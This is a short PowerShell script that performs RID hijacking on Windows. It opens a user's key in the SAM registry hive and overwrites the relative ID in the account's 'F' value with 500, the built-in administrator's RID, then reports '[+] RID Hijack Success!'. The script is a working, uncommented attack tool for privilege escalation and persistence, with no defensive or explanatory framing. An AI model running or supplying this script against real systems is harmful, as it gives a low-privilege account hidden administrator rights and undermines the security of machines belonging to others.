$BaseRID = (Read-Host "Enter 3 digit RID")
$RegistryPath = "HKLM:\SAM\SAM\Domains\Account\Users"
$TargetRID = "00000$BaseRID"
$ValueName = "F"
$Position = 0x30
# 01F4 is hex for 500 (SID of local administrator account)
$NewValueHex = "01F4"

function Modify-RegistryValue {
    param (
        [string]$Path,
        [string]$RID,
        [string]$ValueName,
        [int]$Position,
        [string]$NewValueHex
    )

    $keyPath = Join-Path $Path $RID

    if (Test-Path $keyPath) {
        $value = Get-ItemProperty -Path $keyPath -Name $ValueName

        if ($null -ne $value) {
            [byte[]]$bytes = $value.$ValueName
            $newValue = [Convert]::ToUInt32($NewValueHex, 16)

            [Array]::Copy([BitConverter]::GetBytes($newValue), 0, $bytes, $Position, 4)
            Set-ItemProperty -Path $keyPath -Name $ValueName -Value $bytes
            
            $hexPosition = "{0:X}" -f $Position
            Write-Output "[+] RID Hijack Success! Modified the '$ValueName' value at position $hexPosition in key $keyPath"
        } else {
            Write-Output "[-] Value $ValueName not found in key $keyPath"
        }
    } else {
        Write-Output "Key $keyPath not found"
    }
}

Modify-RegistryValue -Path $RegistryPath -RID $TargetRID -ValueName $ValueName -Position $Position -NewValueHex $NewValueHex
